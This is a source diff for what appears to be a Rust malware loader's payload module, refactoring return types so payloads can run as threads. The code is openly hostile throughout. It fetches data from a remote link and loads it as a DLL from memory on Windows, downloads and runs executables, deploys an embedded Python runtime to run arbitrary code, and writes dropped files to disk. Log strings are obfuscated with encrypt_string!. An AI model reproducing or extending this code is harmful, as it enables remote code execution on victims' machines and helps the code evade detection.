@@ -33,6 +33,11 @@ use cryptify::encrypt_string;
 
 use anyhow::Result;
 
+pub enum PayloadExec {
+    NoThread(),
+    Thread(thread::JoinHandle<()>, Payload),
+}
+
 //TODO remove the () and Empty
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
@@ -40,25 +45,27 @@ pub enum Payload {
     DownloadAndExec(DownloadAndExec),
     ExecPython(ExecPython),
     Banner(),
-    Empty(Empty),
     DownloadFile(WriteFile),
     Exec(Exec),
 }
 impl Payload {
-    pub fn exec_payload(&self) {
+    pub fn exec_payload(&self) -> PayloadExec {
         //TODO return all data
         let exec_result = match &self {
             Payload::DllFromMemory(payload) => payload.dll_from_memory(),
             Payload::DownloadAndExec(payload) => payload.download_and_exec(),
             Payload::ExecPython(payload) => payload.deploy_embedder(),
-            Payload::Banner() => Ok(banner()),
-            Payload::Empty(payload) => Ok(payload.void()),
+            Payload::Banner() => banner(),
             Payload::DownloadFile(payload) => payload.download_file(),
             Payload::Exec(payload) => payload.exec_file(),
         };
+        //    Ok(PayloadExec::NoThread())
         match exec_result {
-            Ok(_) => {}
-            Err(e) => error!("{}{}", encrypt_string!("exec error: "), e),
+            Ok(a) => a,
+            Err(e) => {
+                error!("{}{}", encrypt_string!("exec error: "), e);
+                PayloadExec::NoThread()
+            }
         }
     }
     pub fn print_payload(&self) {
@@ -77,15 +84,21 @@ pub struct DllFromMemory {
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self) -> Result<(), anyhow::Error> {
+    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
         error!("Its linux, impossible to run this payload: dll_from_memory");
-        Ok(())
+        Ok(PayloadExec::NoThread())
+        /*let dllthread = thread::spawn(move || {
+            info!("hey");
+        });
+        Ok(PayloadExec::Thread(dllthread, Payload::DllFromMemory(self.clone())))
+        */
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self) -> Result<(), anyhow::Error> {
+    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data()?;
 
+        if true { 
         let thread_dll_entrypoint = self.dll_entrypoint.clone();
         let dllthread = thread::spawn(move || {
             let dll_data: &[u8] = &data;
@@ -106,11 +119,16 @@ impl DllFromMemory {
             let result = dll_entry_point();
             debug!("{}{}", encrypt_string!("DLL result = "), result);
         });
+        return Ok(PayloadExec::Thread(dllthread, Payload::DllFromMemory(self.clone())));
+    
+        }else{
+            //normal exec
 
+        }
         //TODO quand on part d'ici, il y a un probleme
         //info!("{}", encrypt_string!("-> TODO repair unsafe"));
-        
-        Ok(())
+
+        Ok(PayloadExec::NoThread())
     }
 }
 
@@ -122,7 +140,7 @@ pub struct DownloadAndExec {
     pub exec_cmdline: String,
 }
 impl DownloadAndExec {
-    pub fn download_and_exec(&self) -> Result<(), anyhow::Error> {
+    pub fn download_and_exec(&self) -> Result<PayloadExec, anyhow::Error> {
         let body: Vec<u8> = self.link.fetch_data()?;
 
         let data_write_path = self.write_file(body)?;
@@ -132,7 +150,7 @@ impl DownloadAndExec {
         //https://doc.rust-lang.org/std/process/struct.Command.html
     }
     // https://doc.rust-lang.org/std/process/struct.Command.html
-    pub fn exec_file(&self, data_write_path: String) -> Result<(), anyhow::Error> {
+    pub fn exec_file(&self, data_write_path: String) -> Result<PayloadExec, anyhow::Error> {
         let mut comm = Command::new(&data_write_path);
 
         for i in self.exec_cmdline.trim().split_whitespace() {
@@ -143,7 +161,7 @@ impl DownloadAndExec {
             .output()
             .expect(&encrypt_string!("failed to execute process"));
         let _hello = output.stdout;
-        Ok(())
+        Ok(PayloadExec::NoThread())
     }
     pub fn write_file(&self, body: Vec<u8>) -> Result<String, anyhow::Error> {
         let data_write_path = self.calculate_out_path();
@@ -209,16 +227,16 @@ pub struct ExecPython {
 }
 impl ExecPython {
     #[cfg(target_os = "linux")]
-    pub fn deploy_embedder(&self) -> Result<(), anyhow::Error> {
+    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
         error!(
             "{}",
             encrypt_string!("!Its linux, impossible to run this payload: deploy_embedder")
         );
-        Ok(())
+        Ok(PayloadExec::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn deploy_embedder(&self) -> Result<(), anyhow::Error> {
+    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
         let _ = self.download_and_unzip_python();
         info!(
             "{}{}\n",
@@ -226,7 +244,7 @@ impl ExecPython {
             &self.python_code
         );
         embedder::embedder(&self.out_filepath, &self.python_code);
-        Ok(())
+        Ok(PayloadExec::NoThread())
     }
 
     pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
@@ -248,7 +266,7 @@ impl ExecPython {
     }
 }
 
-pub fn banner() {
+pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     let banner: &str = r#"
                                  ╓╖
                          , ▒╗,  ▒▒▒▒╖   ╓▒▒
@@ -281,12 +299,7 @@ pub fn banner() {
     println!("");
     let sleep_time = time::Duration::from_millis(3000);
     thread::sleep(sleep_time);
-}
-
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct Empty {}
-impl Empty {
-    pub fn void(&self) {}
+    Ok(PayloadExec::NoThread())
 }
 
 fn random_string() -> String {
@@ -325,17 +338,17 @@ use std::fs::create_dir_all;
 use shellexpand;
 
 impl WriteFile {
-    pub fn download_file(&self) -> Result<(), anyhow::Error> {
+    pub fn download_file(&self) -> Result<PayloadExec, anyhow::Error> {
         let body: Vec<u8> = self.link.fetch_data()?;
         //let data_write_path = self.write_file(body)?;
         //TODO calculate the PATH, create
         let path: PathBuf = calculate_path(&self.path)?;
-        let _ = create_diretory(&path);
+        let _ = create_diretory(&path)?;
 
         let mut f = File::create(&path)?;
         info!("[+] Write file: {:?}", path);
         f.write_all(&body)?;
-        Ok(())
+        Ok(PayloadExec::NoThread())
     }
 }
 
@@ -370,7 +383,7 @@ pub struct Exec {
 }
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
-    pub fn exec_file(&self) -> Result<(), anyhow::Error> {
+    pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
         info!("Exec {:?} {}", &path, &self.cmdline);
         let mut comm = Command::new(&path);
@@ -383,6 +396,6 @@ impl Exec {
             .output()
             .expect(&encrypt_string!("failed to execute process"));
         let _hello: Vec<u8> = output.stdout;
-        Ok(())
+        Ok(PayloadExec::NoThread())
     }
 }
